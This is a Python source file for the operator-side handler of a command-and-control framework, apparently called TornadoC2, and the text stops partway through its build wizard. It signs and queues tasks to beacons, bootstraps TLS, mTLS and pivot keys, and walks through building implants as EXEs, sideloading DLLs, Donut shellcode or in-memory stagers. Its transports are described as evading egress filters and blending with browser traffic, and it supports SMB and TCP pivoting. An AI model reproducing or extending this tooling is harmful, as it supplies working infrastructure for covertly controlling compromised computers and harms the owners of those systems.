"""Beacon-only handler.

The operator-side entry point for a pull-based C2. Runs the beacon
listener, signs and queues tasks, compiles agents, and provides the
interactive operator console.

There is no shell listener, no PTY session, no secondary transport,
no plugin system. What lives here is:

  * The ECDSA task signer (``CommandSigner``).
  * The TLS / mTLS certificate bootstrap.
  * The operator console with readline completion.
  * The ``beacon-build`` wizard and the non-interactive build path.
  * A thin startup that boots ``BeaconListener`` and drops into the
    main loop.

The beacon engine reads exactly three attributes off this handler:

  * ``handler.colors``    — the console color dictionary.
  * ``handler.registry``  — the shared session registry.
  * ``handler.signer``    — the ECDSA signer, or ``None``.

Everything else in ``beacon/`` is self-contained.
"""

import argparse
import base64
import os
import socket
import subprocess
import sys
import time

import secrets

from .constants import BEACON_COMMANDS, MAIN_COMMANDS
from .session_log import SessionLogger           # noqa: F401  (beacon engine)
from .session_registry import SessionRegistry

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

# ---------------------------------------------------------------------
# ECDSA signing
# ---------------------------------------------------------------------
# The handler generates a fresh P-256 keypair at startup. The private
# key is persisted under ``.keys/handler_signing.key`` so agents built
# against a previous handler run continue to verify tasks after a
# restart.

try:
    from cryptography.hazmat.primitives.asymmetric import ec as _ec
    from cryptography.hazmat.primitives import hashes as _hashes
    from cryptography.hazmat.primitives import serialization as _ser
    _ECDSA_AVAILABLE = True
except ImportError:
    _ECDSA_AVAILABLE = False


class CommandSigner:
    """Per-run ECDSA P-256 keypair used to sign every task dispatched
    to a beacon.

    The corresponding public key is embedded in every agent at build
    time. An agent refuses to execute any task whose signature does
    not verify against that key."""

    KEY_PATH = os.path.join('.keys', 'server', 'handler_signing.key')

    def __init__(self):
        if not _ECDSA_AVAILABLE:
            raise RuntimeError('cryptography not installed')
        self.private = self._load_or_generate()
        self.public_pem = self.private.public_key().public_bytes(
            encoding=_ser.Encoding.PEM,
            format=_ser.PublicFormat.SubjectPublicKeyInfo,
        ).decode('ascii')

    def _load_or_generate(self):
        if os.path.isfile(self.KEY_PATH):
            try:
                with open(self.KEY_PATH, 'rb') as fh:
                    return _ser.load_pem_private_key(
                        fh.read(), password=None)
            except Exception as exc:
                raise RuntimeError(
                    f"handler signing key at {self.KEY_PATH!r} "
                    f"exists but cannot be loaded: {exc}. Move it "
                    f"aside to generate a new keypair (this "
                    f"invalidates every built agent), or restore it "
                    f"from backup.") from exc

        priv = _ec.generate_private_key(_ec.SECP256R1())
        try:
            os.makedirs(
                os.path.dirname(self.KEY_PATH) or '.', exist_ok=True)
            with open(self.KEY_PATH, 'wb') as fh:
                fh.write(priv.private_bytes(
                    encoding=_ser.Encoding.PEM,
                    format=_ser.PrivateFormat.PKCS8,
                    encryption_algorithm=_ser.NoEncryption(),
                ))
            try:
                os.chmod(self.KEY_PATH, 0o600)
            except OSError:
                pass
        except OSError:
            pass
        return priv

    def sign(self, payload: bytes) -> bytes:
        return self.private.sign(payload, _ec.ECDSA(_hashes.SHA256()))


# ---------------------------------------------------------------------
# Handler

class BeaconHandler:
    """The operator-side handler for the beacon subsystem.

    Provides the minimum surface the beacon engine, listener, and
    console need. No listeners are started in ``__init__`` — the
    beacon listener is created by ``start()`` and owns its own TLS
    context."""

    def __init__(self,
                 host='0.0.0.0',
                 beacon_port=8881,
                 certfile=os.path.join('tls_certs', 'server.pem'),
                 keyfile=os.path.join('tls_certs', 'server.key'),
                 mtls_ca_cert=os.path.join('mtls_certs', 'ca.pem'),
                 mtls_ca_key=os.path.join('mtls_certs', 'ca.key'),
                 mtls_server_cert=os.path.join(
                     'mtls_certs', 'server-mtls.pem'),
                 mtls_server_key=os.path.join(
                     'mtls_certs', 'server-mtls.key'),
                 mtls_client_cert=os.path.join('mtls_certs', 'client.pem'),
                 mtls_client_key=os.path.join(
                     'mtls_certs', 'client.key')):
        self.host = host
        self.beacon_port = beacon_port
        self.certfile = certfile
        self.keyfile = keyfile
        self.mtls_ca_cert = mtls_ca_cert
        self.mtls_ca_key = mtls_ca_key
        self.mtls_server_cert = mtls_server_cert
        self.mtls_server_key = mtls_server_key
        self.mtls_client_cert = mtls_client_cert
        self.mtls_client_key = mtls_client_key
        self.mtls_cert_dir = os.path.dirname(mtls_ca_cert) or '.'
        self.tls_cert_dir = os.path.dirname(certfile) or '.'
        self.colors = {
            'cyan':   '\033[96m',
            'green':  '\033[92m',
            'yellow': '\033[93m',
            'red':    '\033[91m',
            'bold':   '\033[1m',
            'end':    '\033[0m',
            'blue':   '\033[94m',
            'dim':    '\033[2m',
            'magenta': '\033[95m',
        }

        self.registry = SessionRegistry()

        for _sub in ('server', 'agent'):
            _kd = os.path.join('.keys', _sub)
            os.makedirs(_kd, mode=0o700, exist_ok=True)
            try:
                os.chmod(_kd, 0o700)
            except OSError:
                pass

        self.signer = None
        if _ECDSA_AVAILABLE:
            try:
                self.signer = CommandSigner()
            except Exception as e:
                print(f"[sign] disabled: {e}")

        self.server_ecdh = None
        try:
            from .beacon.wire import ServerECDH
            self.server_ecdh = ServerECDH(
                os.path.join('.keys', 'server', 'server_ecdh.key'))
        except Exception as e:
            print(f"[wire] disabled: {e}")

        self.beacon = None
        self.beacon_console = None
        self._beacon_listener = None
        self._pivot_manager = None
        self._client_tunnel = None
        self.no_audit_verify = False
        self.operator_port = None
        self.operator_host = '127.0.0.1'
        self.operator_listener = None
        self.operator_registry = None
        self.audit_log = None
        self._multiplayer = None
        self.multiplayer_off = False

        self.beacon_mtls_ca = None
        self.beacon_mtls_dir = None
        self.beacon_mtls_server_cert = None
        self.beacon_mtls_server_key = None

        self.beacon_c2_profile = None

        self.dns_port = None
        self.dns_domain = None
        self._dns_transport = None
        self.icmp_enabled = False
        self._icmp_transport = None

        self.quic_port = None
        self._quic_listener = None

        self.ws_port = None
        self.ws_host = None
        self._ws_listener = None
        self._ws_server = None

        self.wireguard_enabled = False
        self.wireguard_port = 51820
        self.wireguard_subnet = '10.99.0.0/24'
        self.wireguard_server_ip = '10.99.0.1'
        self._wireguard_transport = None

        self.profile = None

        self._completer_mode = 'main'
        self._completion_matches = []

        self.deadman = None

    # ------------------------------------------------------------------
    # Banner

    def print_banner(self):
        c = self.colors
        banner = f"""
{c['cyan']}{c['bold']}
██████╗ ███████╗ █████╗  ██████╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
██████╔╝█████╗  ███████║██║     ██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██╔══██║██║     ██║   ██║██║╚██╗██║
██████╔╝███████╗██║  ██║╚██████╗╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
{c['end']}
{c['green']}Listener:{c['end']} {self.host}:{self.beacon_port}
"""
        print(banner)

    # ------------------------------------------------------------------
    # TLS / mTLS certificate bootstrap

    def _openssl_executable(self):
        return 'openssl.exe' if os.name == 'nt' else 'openssl'

    @staticmethod
    def _ensure_dir_for(path):
        d = os.path.dirname(path)
        if d:
            os.makedirs(d, exist_ok=True)

    def _run_openssl(self, cmd, label):
        try:
            r = subprocess.run(
                cmd, capture_output=True, text=True, check=False)
        except FileNotFoundError:
            print(f"{self.colors['red']}[TLS] "
                  f"{self._openssl_executable()} not found on PATH"
                  f"{self.colors['end']}")
            sys.exit(1)
        if r.returncode != 0:
            print(f"{self.colors['red']}{label} failed:"
                  f"{self.colors['end']}")
            print((r.stderr or r.stdout or '').strip())
            sys.exit(1)

    def ensure_tls_certificates(self):
        """Generate a self-signed TLS pair if none exists."""
        if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
            return
        self._ensure_dir_for(self.certfile)
        self._ensure_dir_for(self.keyfile)
        print(f"\n{self.colors['yellow']}[TLS] Generating self-signed "
              f"pair.{self.colors['end']}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Certificate : {self.certfile}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Private key : {self.keyfile}")
        self._run_openssl([
            self._openssl_executable(),
            'req', '-x509',
            '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-days', '3650',
            '-keyout', self.keyfile,
            '-out',    self.certfile,
            '-subj',   '/CN=localhost',
        ], 'TLS generation')
        print(f"{self.colors['green']}[TLS] generated."
              f"{self.colors['end']}\n")

    def ensure_mtls_certificates(self):
        """Bootstrap a full mTLS PKI if any file is missing.

        The bootstrap is all-or-nothing: if every expected file is
        already present, generation is skipped. If any single file is
        missing, the entire bundle is regenerated. Removing one file
        from the bundle invalidates the existing trust chain.
        """
        needed = [
            self.mtls_ca_cert, self.mtls_ca_key,
            self.mtls_server_cert, self.mtls_server_key,
            self.mtls_client_cert, self.mtls_client_key,
        ]
        if all(os.path.exists(p) for p in needed):
            return
        self._ensure_dir_for(self.mtls_ca_cert)
        openssl = self._openssl_executable()
        print(f"\n{self.colors['yellow']}[mTLS] Bootstrapping PKI."
              f"{self.colors['end']}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Output dir   : {self.mtls_cert_dir}{os.sep}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"CA           : 4096-bit RSA, valid 3650 days")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Server cert  : CN=localhost, signed by CA")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Client cert  : CN=beacon-client, signed by CA")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Client bundle: embed client.pem + client.key + ca.pem "
              f"in the agent")

        self._run_openssl([
            openssl, 'req', '-x509',
            '-newkey', 'rsa:4096', '-sha256', '-nodes',
            '-days', '3650',
            '-keyout', self.mtls_ca_key,
            '-out',    self.mtls_ca_cert,
            '-subj',   '/CN=Beacon-mTLS-CA',
        ], 'CA generation')

        server_csr = self.mtls_server_cert + '.csr'
        client_csr = self.mtls_client_cert + '.csr'

        self._run_openssl([
            openssl, 'req',
            '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-keyout', self.mtls_server_key,
            '-out',    server_csr,
            '-subj',   '/CN=localhost',
        ], 'Server CSR generation')

        self._run_openssl([
            openssl, 'x509', '-req', '-in', server_csr,
            '-CA', self.mtls_ca_cert,
            '-CAkey', self.mtls_ca_key,
            '-CAcreateserial',
            '-out', self.mtls_server_cert,
            '-days', '3650', '-sha256',
        ], 'Server certificate signing')

        self._run_openssl([
            openssl, 'req',
            '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-keyout', self.mtls_client_key,
            '-out',    client_csr,
            '-subj',   '/CN=beacon-client',
        ], 'Client CSR generation')

        self._run_openssl([
            openssl, 'x509', '-req', '-in', client_csr,
            '-CA', self.mtls_ca_cert,
            '-CAkey', self.mtls_ca_key,
            '-CAcreateserial',
            '-out', self.mtls_client_cert,
            '-days', '3650', '-sha256',
        ], 'Client certificate signing')

        for csr in (server_csr, client_csr):
            try:
                os.remove(csr)
            except OSError:
                pass

        print(f"{self.colors['green']}[mTLS] PKI initialized."
              f"{self.colors['end']}\n")

    def ensure_pivot_keypair(self):
        """Bootstrap the engagement-wide pivot keypair if missing.

        The file lives at ``<mtls_cert_dir>/pivot.pem`` — by
        default ``mtls_certs/pivot.pem`` — and is the same file
        every SMB and TCP parent and child build reads at compile
        time via ``--pivot-key``. The private half goes into every
        parent binary; the public half into every child.

        Generated once per engagement, on first handler start, and
        never regenerated. Regenerating it invalidates every parent
        and every child binary ever built against it — existing
        pivots stop handshaking on their next reconnect, and the
        only fix is to rebuild every parent and every child.

        If the file already exists this does nothing: no rewrite,
        no reprint, no chance of accidentally rotating the key.
        """
        pivot_dir = self.mtls_cert_dir or 'mtls_certs'
        path = os.path.join(pivot_dir, 'pivot.pem')

        if os.path.isfile(path):
            return

        try:
            from .beacon.builder import generate_pivot_keypair
        except ImportError as exc:
            print(f"{self.colors['yellow']}[PIVOT] builder "
                  f"unavailable ({exc}) — skipping pivot keypair "
                  f"generation. SMB and TCP builds will fail "
                  f"until you run `beacon-build --pivot-key-gen` "
                  f"manually.{self.colors['end']}")
            return

        try:
            generate_pivot_keypair(path)
        except RuntimeError as exc:
            print(f"{self.colors['yellow']}[PIVOT] could not "
                  f"generate the pivot keypair: {exc}"
                  f"{self.colors['end']}")
            print(f"{self.colors['yellow']}  SMB and TCP builds "
                  f"will fail until you run `beacon-build "
                  f"--pivot-key-gen` manually."
                  f"{self.colors['end']}")
            return

        print(f"\n{self.colors['yellow']}[PIVOT] Bootstrap pivot "
              f"keypair.{self.colors['end']}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"File         : {path}")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Every SMB and TCP parent and child build reads "
              f"the same file via --pivot-key.")
        print(f"  {self.colors['cyan']}→{self.colors['end']} "
              f"Back it up alongside the team CA — losing it "
              f"means rebuilding every pivot binary.")
        print(f"{self.colors['green']}[PIVOT] keypair generated."
              f"{self.colors['end']}\n")

    # ------------------------------------------------------------------
    # Readline completion

    def _init_readline(self):
        if not readline:
            return
        self._completer_mode = 'main'
        self._completion_matches = []
        try:
            if 'libedit' in (readline.__doc__ or ''):
                readline.parse_and_bind('bind ^I rl_complete')
            else:
                readline.parse_and_bind('tab: complete')
        except Exception:
            pass
        readline.set_completer_delims(' \t\n')
        readline.set_history_length(1000)
        readline.set_completer(self._readline_complete)

    def _set_completer_mode(self, mode):
        if readline:
            self._completer_mode = mode

    def _readline_complete(self, text, state):
        if state == 0:
            self._completion_matches = self._completion_candidates(text)
        try:
            return self._completion_matches[state]
        except IndexError:
            return None

    def _completion_arg_index(self):
        """Return the index of the word the cursor is on."""
        line = readline.get_line_buffer()
        begidx = readline.get_begidx()
        prefix = line[:begidx]
        ends_space = prefix.endswith(' ') or prefix.endswith('\t')
        words = prefix.split()
        if not words:
            return 0
        if ends_space:
            return len(words)
        return len(words) - 1

    def _get_beacon_ids(self):
        """Return live beacon IDs as strings."""
        if self.beacon is None:
            return []
        try:
            return sorted(str(s.id) for s in self.beacon.list_all())
        except Exception:
            return []

    def _complete_paths(self, text):
        """Complete a local filesystem path."""
        raw = os.path.expanduser(text or '')
        if raw.endswith(os.sep) or raw.endswith('/'):
            dirname, basename = raw, ''
        else:
            dirname, basename = os.path.split(raw)
        if not dirname:
            dirname = '.'
        if not os.path.isdir(dirname):
            return []
        matches = []
        try:
            for entry in sorted(os.listdir(dirname)):
                if entry.startswith(basename):
                    full = os.path.join(dirname, entry)
                    if os.path.isdir(full):
                        matches.append(full + os.sep)
                    else:
                        matches.append(full)
        except OSError:
            return []
        return matches

    def _complete_extension_names(self, text):
        """List extension names from the operator-side store."""
        if self.beacon_console is None:
            return []
        try:
            ext = self.beacon_console._list_local_extensions()
        except Exception:
            return []
        return sorted(name for name in ext if name.startswith(text))

    def _completion_candidates(self, text):
        if not readline:
            return []
        arg_i = self._completion_arg_index()
        words = readline.get_line_buffer().split()
        cmd = words[0].lower() if words else ''
        mode = getattr(self, '_completer_mode', 'main')

        # ---- Beacon submenu -----------------------------------------
        if mode == 'beacon':
            if arg_i == 0:
                return sorted(c for c in BEACON_COMMANDS
                              if c.startswith(text.lower()))

            # `extension <sub> <name>`
            if cmd == 'extension':
                if arg_i == 1:
                    subs = ('list', 'info', 'load',
                            'unload', 'list-loaded')
                    return sorted(s for s in subs
                                  if s.startswith(text.lower()))
                if arg_i == 2 and words[1].lower() in (
                        'info', 'load', 'unload'):
                    return self._complete_extension_names(text)

            # Local file paths.
            if cmd in ('upload', 'download',
                       'pyexec', 'psexec', 'shexec',
                       'execmem', 'bof') and arg_i == 1:
                return self._complete_paths(text)

            return []

        # ---- Main menu ----------------------------------------------
        if arg_i == 0:
            return sorted(c for c in MAIN_COMMANDS
                          if c.startswith(text.lower()))

        if arg_i == 1 and cmd in (
                'beacon', 'beacon-rm', 'beacon-forget'):
            return sorted(i for i in self._get_beacon_ids()
                          if i.startswith(text))

        return []

    # ------------------------------------------------------------------
    # Helpers used by beacon_build

    def _format_size(self, nbytes):
        for unit in ('B', 'KB', 'MB', 'GB'):
            if nbytes < 1024 or unit == 'GB':
                if unit == 'B':
                    return f"{nbytes} B"
                return f"{nbytes:.1f} {unit}"
            nbytes /= 1024

    def _beacon_build_dir(self):
        """Return (source_dir, output_dir) for the beacon builder.

        ``source_dir`` is ``<package>/beacon/``, whose parent is the
        package directory. ``output_dir`` is ``<repo>/beacon_output/``,
        one level above the package.
        """
        here = os.path.dirname(os.path.abspath(__file__))
        source_dir = os.path.join(here, 'beacon')
        output_dir = os.path.join(os.path.dirname(here), 'beacon_output')
        return source_dir, output_dir

    def _beacon_build_default_url(self, for_quic=False):
        """Derive a sensible callback URL from the running config.

        `for_quic=True` uses the QUIC listener's port when one was
        configured at handler start (`--beacon-quic-port`). When no
        QUIC listener is running, the value falls through to the
        HTTP listener's port — the operator who then types a
        different port is telling the wizard something the handler
        does not know.
        """
        if for_quic and getattr(self, 'quic_port', None):
            port = self.quic_port
        else:
            port = self.beacon_port or 8444
        host = self.host if self.host not in ('0.0.0.0', '::') \
               else '127.0.0.1'
        return f"https://{host}:{port}"

    # ------------------------------------------------------------------
    # Build wizard (interactive)

    def _beacon_build_interactive(self):
        """Prompt for build parameters. Returns a dict, or None on cancel.

        Every prompt accepts an empty line to take the default, or `q`
        to abort. Choices are numbered so an operator can pick with a
        single keypress instead of typing a value.
        """
        c = self.colors

        def _ask(prompt, default=''):
            suffix = f" [{default}]" if default else ""
            try:
                val = input(f"  {prompt}{suffix}: ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return None
            if val.lower() in ('q', 'quit', 'cancel'):
                return None
            return val or default

        def _choose(title, options, default_index=0):
            """options: list of (value, label, description_or_None)."""
            print(f"\n{c['cyan']}{title}{c['end']}")
            for i, (_v, label, desc) in enumerate(options, 1):
                marker = '●' if (i - 1) == default_index else ' '
                desc_str = (f"  {c['yellow']}— {desc}{c['end']}"
                            if desc else "")
                print(f"  {marker} {i}. {label}{desc_str}")
            while True:
                try:
                    val = input(
                        f"  {c['green']}Choice "
                        f"[{default_index + 1}]{c['end']} "
                        f"{c['yellow']}(q to cancel){c['end']}: "
                    ).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print()
                    return None
                if val == 'q':
                    return None
                if val == '':
                    return options[default_index][0]
                try:
                    idx = int(val) - 1
                except ValueError:
                    print(f"  {c['red']}Enter a number between 1 and "
                          f"{len(options)}{c['end']}")
                    continue
                if 0 <= idx < len(options):
                    return options[idx][0]
                print(f"  {c['red']}Out of range{c['end']}")

        print(f"\n{c['cyan']}{'='*60}{c['end']}")
        print(f"{c['cyan']}  Beacon Agent Builder{c['end']}")
        print(f"{c['cyan']}{'='*60}{c['end']}")

        # ---- 1. Target OS ------------------------------------------
        target_os = _choose(
            '[1/9] Target OS',
            [
                ('linux',   'linux',
                 'ELF binary — shells, servers, containers'),
                ('windows', 'windows',
                 'PE binary — workstations, servers'),
            ],
            default_index=0,
        )
        if target_os is None:
            return None

        # ---- 2. Architecture ---------------------------------------
        arch_opts = [
            ('amd64', 'amd64', 'x86-64 (most common)'),
            ('arm64', 'arm64', 'AArch64 (modern servers)'),
            ('386',   '386',   '32-bit x86 (legacy)'),
        ]
        target_arch = _choose('[2/9] Architecture', arch_opts, 0)
        if target_arch is None:
            return None

        # ---- 3. Output format --------------------------------------
        common_fmt = [
            ('shellcode', 'shellcode',
             'position-independent via Donut'),
            ('stager', 'stager',
             'minimal first-stage implant; fetches the full agent'),
        ]
        fmt_opts = ([
            ('elf', 'elf', 'plain ELF executable'),
        ] + common_fmt) if target_os == 'linux' else ([
            ('exe', 'exe', 'Windows PE executable'),
            ('dll', 'dll', 'Windows DLL (for sideloading)'),
        ] + common_fmt)
        output_format = _choose('[3/9] Output format', fmt_opts, 0)
        if output_format is None:
            return None

        # Stager-only prompts. Collected here so the values flow
        # through the same params dict the CLI path uses.
        stage_key_hex = ''
        stage_name = ''
        if output_format == 'stager':
            print(f"\n{c['cyan']}[3b/9] Stager options{c['end']}")
            print(f"  {c['yellow']}The stager is a small first-stage "
                  f"implant. It checks in, fetches the full agent "
                  f"from the server, and runs it in memory. The full "
                  f"agent must already be staged under payloads/ on "
                  f"the server.{c['end']}")
            stage_name = _ask(
                'Payload name to fetch (blank = server default)', '')
            if stage_name is None:
                return None
            print(f"  {c['yellow']}Leave the key blank to generate a "
                  f"fresh AES-256 key. The key is written to "
                  f"payloads/stage_keys.json so the server knows "
                  f"which key to encrypt with.{c['end']}")
            stage_key_hex = _ask(
                'Stage key (hex, 64 chars; blank = auto)', '')
            if stage_key_hex is None:
                return None

        # ---- 4. Transport mode -------------------------------------
        #
        # Each entry is (transport_mode, label, description).
        # Adding a new transport to the wizard is one entry here
        # plus a conditional block below for any transport-specific
        # prompts. The framework-side work is documented in
        # README.md › Extending TornadoC2 › Adding a transport —
        # two classes plus mechanical glue across seven files. The
        # wizard only needs the display label and the
        # transport_mode value.
        transport_opts = [
            ('http', 'http',
             'HTTPS + JSON — default; requires a reachable '
             'callback URL'),
            ('quic', 'quic',
             'QUIC / HTTP/3 over UDP. Same C2 protocol as HTTP, '
             'different carriage — reaches networks that permit '
             'HTTP/3 but block or proxy direct TCP. Requires a '
             'reachable callback URL.'),
            ('websocket', 'websocket',
             'WebSocket over TLS (wss://). Opens one connection '
             'per check-in cycle. Blends with modern browser and '
             'SaaS traffic — indistinguishable from a chat or '
             'analytics client on most networks. Requires a '
             'reachable URL; the scheme is converted to wss:// '
             'at connect time.'),
            ('dns',  'dns',
             'DNS TXT queries — works through most egress filters; '
             'requires an authoritative zone'),
            ('doh',  'doh',
             'DNS over HTTPS — the DNS wire format sent to a public '
             'resolver over HTTPS. Blends with browser DoH; escapes '
             'UDP/53 blocks. Requires an authoritative zone.'),
            ('wireguard', 'wireguard',
             'WireGuard UDP tunnel. Same C2 protocol as HTTP, '
             'carried inside a userspace WireGuard device. '
             'Requires the server\'s WireGuard public key and a '
             'pre-generated agent private key. Reaches networks '
             'that permit UDP/51820 but filter TCP.'),
            ('http,dns', 'http,dns',
             'HTTPS primary, rotate to DNS after N failures — '
             'two transports, one binary'),
            ('http,doh', 'http,doh',
             'HTTPS primary, rotate to DoH after N failures'),
            ('dns,doh',  'dns,doh',
             'UDP DNS primary, rotate to DoH after N failures — '
             'UDP-first for speed, DoH when UDP/53 is filtered'),
        ]
        if target_os == 'windows':
            transport_opts.append(
                ('smb', 'smb',
                 'Windows named pipe — connect to a parent beacon '
                 'that has smb_relay_pipe set'),
            )
        if target_os != 'windows':
            transport_opts.append(
                ('icmp', 'icmp',
                 'ICMP echo — Linux only. Requires CAP_NET_RAW on '
                 'the C2 host. Use when the network permits only '
                 'ping outbound.'),
            )
        transport_opts.append(
            ('tcp', 'tcp',
             'TCP listener — a parent beacon or the operator '
             'connects inbound. Reverses the pull direction; use '
             'when the target cannot reach the team server.'),
        )
        transport_opts.append(
            ('tcprev', 'tcp-reverse',
             'TCP reverse — the child dials out to a parent that '
             'is listening on a TCP port. Inverse of tcp-bind: the '
             'parent listens, the child connects. Use when the '
             'child can reach the parent\'s network but the parent '
             'cannot reach the child.'),
        )
        transport_mode = _choose(
            '[4/9] Transport', transport_opts, default_index=0)
        if transport_mode is None:
            return None

        smb_pipe = ''
        smb_relay_pipe = ''
        tcp_bind_addr = ''
        tcp_bind_token = ''
        tcp_relay_target = ''
        tcp_relay_token = ''
        tcp_rev_listen = ''
        tcp_rev_target = ''
        tcp_rev_token = ''
        transport_failover_after = 3
        wireguard_server_pubkey = ''
        wireguard_server_addr = ''
        wireguard_agent_privkey = ''
        wireguard_tunnel_ip = ''
        wireguard_server_tunnel_ip = ''
        wireguard_inner_port = ''

        if transport_mode == 'wireguard':
            print(f"\n{c['cyan']}[4b/9] WireGuard configuration"
                  f"{c['end']}")
            print(f"  {c['yellow']}The handler generates the "
                  f"server keypair on first run and prints the "
                  f"public key at startup. Copy that value here."
                  f"{c['end']}")
            wireguard_server_pubkey = _ask(
                'Server public key (base64)', '')
            if wireguard_server_pubkey is None:
                return None
            if not wireguard_server_pubkey.strip():
                print(f"  {c['red']}The server public key is "
                      f"required.{c['end']}")
                return None
            print(f"  {c['yellow']}The server's UDP listener "
                  f"address as reachable from the target "
                  f"(host:port).{c['end']}")
            wireguard_server_addr = _ask(
                'Server UDP address', '')
            if wireguard_server_addr is None:
                return None
            if not wireguard_server_addr.strip():
                print(f"  {c['red']}The server address is "
                      f"required.{c['end']}")
                return None
            print(f"  {c['yellow']}Generate a fresh agent keypair "
                  f"with `wg genkey | tee agent.key | wg pubkey`. "
                  f"Paste the private half here and pin the "
                  f"public half on the server with "
                  f"`wireguard add-peer` after deployment."
                  f"{c['end']}")
            wireguard_agent_privkey = _ask(
                'Agent private key (base64)', '')
            if wireguard_agent_privkey is None:
                return None
            if not wireguard_agent_privkey.strip():
                print(f"  {c['red']}The agent private key is "
                      f"required.{c['end']}")
                return None
            print(f"  {c['yellow']}The agent's IPv4 address inside "
                  f"the tunnel (10.99.0.2 is the convention for "
                  f"the first agent; increment for each additional "
                  f"agent).{c['end']}")
            wireguard_tunnel_ip = _ask(
                'Agent tunnel IPv4', '10.99.0.2')
            if wireguard_tunnel_ip is None:
                return None
            if not wireguard_tunnel_ip.strip():
                print(f"  {c['red']}A tunnel IP is required."
                      f"{c['end']}")
                return None
            handler_server_ip = getattr(
                self, 'wireguard_server_ip', None) or '10.99.0.1'
            print(f"  {c['yellow']}The server's IPv4 address "
                  f"inside the tunnel. Must match the handler's "
                  f"--wireguard-server-ip value; the default is "
                  f"{handler_server_ip}.{c['end']}")
            wireguard_server_tunnel_ip = _ask(
                'Server tunnel IPv4', handler_server_ip)
            if wireguard_server_tunnel_ip is None:
                return None
            if not wireguard_server_tunnel_ip.strip():
                print(f"  {c['red']}A server tunnel IP is required."
                      f"{c['end']}")
                return None
            print(f"  {c['yellow']}The HTTPS port the agent dials "
                  f"inside the tunnel. Must match the handler's "
                  f"--beacon-port value. Leave blank for the "
                  f"default 8881.{c['end']}")
            wireguard_inner_port = _ask(
                'WireGuard inner HTTPS port (blank = 8881)', '')
            if wireguard_inner_port is None:
                return None
            wireguard_inner_port = wireguard_inner_port.strip()
            if wireguard_inner_port:
                if (not wireguard_inner_port.isdigit()
                        or not (1 <= int(wireguard_inner_port) <= 65535)):
                    print(f"  {c['red']}Must be a port number "
                          f"between 1 and 65535, or blank for the "
                          f"default.{c['end']}")
                    return None

        if transport_mode == 'smb':
            print(f"\n{c['cyan']}[4b/9] SMB relay — child side"
                  f"{c['end']}")
            print(f"  {c['yellow']}The child talks to a named pipe "
                  f"on a parent beacon. The parent must be built "
                  f"with --smb-relay-pipe set to the same pipe "
                  f"name (without any path prefix).{c['end']}")
            print(f"  {c['yellow']}Two forms, depending on where "
                  f"the parent runs:{c['end']}")
            print(f"    {c['cyan']}tornado_relay_001{c['end']}"
                  f"  — same-host pivot; the child opens a local "
                  f"pipe on its own machine")
            print(f"    {c['cyan']}\\\\WIN-SRV2\\pipe\\"
                  f"tornado_relay_001{c['end']}  — cross-host "
                  f"pivot; the child opens a pipe on WIN-SRV2 "
                  f"over SMB. WIN-SRV2 must be resolvable from "
                  f"the child and reachable on TCP/445.")
            print(f"  {c['dim']}On bash, single-quote the UNC "
                  f"form so the shell does not collapse the "
                  f"leading backslashes.{c['end']}")
            smb_pipe = _ask('Pipe name or UNC path',
                            'tornado_relay_001')
            if smb_pipe is None:
                return None
            if not smb_pipe.strip():
                print(f"  {c['red']}A pipe name is required."
                      f"{c['end']}")
                return None

        _is_child = (transport_mode in ('smb', 'tcp', 'tcprev'))

        if target_os == 'windows' and not _is_child:
            print(f"\n{c['cyan']}[4c/9] SMB relay — parent side"
                  f"{c['end']}")
            print(f"  {c['yellow']}Optional. If set, this beacon "
                  f"opens a named pipe and relays child check-ins "
                  f"over its own transport. Leave blank for a "
                  f"plain beacon.{c['end']}")
            relay_pipe = _ask(
                'Relay pipe name (blank = skip)', '')
            if relay_pipe is None:
                return None
            smb_relay_pipe = relay_pipe.strip()

        if transport_mode == 'tcp':
            print(f"\n{c['cyan']}[4b/9] TCP bind listener{c['end']}")
            print(f"  {c['yellow']}The beacon opens a listening "
                  f"socket and waits for a connection. A parent "
                  f"beacon with --tcp-relay set will dial it and "
                  f"forward traffic to the team server."
                  f"{c['end']}")
            tcp_bind_addr = _ask('Listen address', '0.0.0.0:4444')
            if tcp_bind_addr is None:
                return None
            if not tcp_bind_addr.strip():
                print(f"  {c['red']}An address is required."
                      f"{c['end']}")
                return None
            tcp_bind_token = _ask(
                'Auth token (64 hex chars, from the parent build)', '')
            if tcp_bind_token is None:
                return None
            if not tcp_bind_token.strip():
                print(f"  {c['red']}a token is required — generate "
                      f"one on the parent side and paste it here."
                      f"{c['end']}")
                return None
            if len(tcp_bind_token) != 64:
                print(f"  {c['red']}token must be exactly 64 hex "
                      f"characters{c['end']}")
                return None
            try:
                bytes.fromhex(tcp_bind_token)
            except ValueError:
                print(f"  {c['red']}token must be valid hex"
                      f"{c['end']}")
                return None

        if transport_mode == 'tcprev':
            print(f"\n{c['cyan']}[4b/9] TCP reverse — child side"
                  f"{c['end']}")
            print(f"  {c['yellow']}The child dials out to a parent "
                  f"beacon that is listening on a TCP port. The "
                  f"parent must be built with --tcp-rev-listen set "
                  f"to a port the child can reach.{c['end']}")
            tcp_rev_target = _ask(
                'Parent listener host:port (as reachable from '
                'this child)', '10.0.0.5:4444')
            if tcp_rev_target is None:
                return None
            if ':' not in tcp_rev_target:
                print(f"  {c['red']}Must be host:port "
                      f"(e.g. 10.0.0.5:4444){c['end']}")
                return None
            tcp_rev_token = _ask(
                'Auth token (64 hex chars, from the parent build)',
                '')
            if tcp_rev_token is None:
                return None
